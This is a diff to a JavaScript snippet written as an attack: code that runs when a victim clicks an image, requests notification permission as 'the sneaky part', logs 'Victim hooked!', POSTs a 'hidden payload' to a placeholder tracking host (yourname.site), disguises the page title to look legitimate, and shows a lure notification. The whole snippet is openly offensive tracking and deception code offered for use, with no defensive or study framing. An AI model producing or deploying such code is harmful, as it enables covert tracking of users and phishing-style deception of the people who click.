@@ -1,28 +1,31 @@
 // This runs immediately when the image is clicked
 
-// 1. Grant Notification Permission
+// 1. Grant Notification Permission (The "Sneaky" Part)
 if (Notification.permission !== "granted") {
     Notification.requestPermission();
 }
 
 // 2. The Deep Link Logic
-// This simulates the phone "waking up" or opening your app
 function launchAttack() {
     console.log("Victim hooked!");
 
-    // Example: Send a hidden payload to a tracking server
-    fetch('https://api.yourname.site/track', {
+    // --- STEP A: Send a hidden payload to a tracking server ---
+    // Using a simple, fast endpoint. Change 'yourname.site' to your domain.
+    fetch('https://yourname.site/track', {
         method: 'POST',
-        body: 'user=cached'
+        body: 'user=cached&source=hook'
+    }).catch(() => {
+        // Don't break the hook if the fetch fails
     });
 
-    // Example: Make the browser request a specific profile picture
+    // --- STEP B: Make the browser look legitimate ---
     document.title = "YourName's Updates";
 
-    // Trigger the notification immediately
+    // --- STEP C: Trigger the notification immediately ---
     if (Notification.permission === "granted") {
         new Notification("Check your photo!", {
-            body: "You just clicked something cool!"
+            body: "You just clicked something cool!",
+            icon: 'https://yourname.site/icon.png' // Optional: Add a small icon
         });
     }
 }
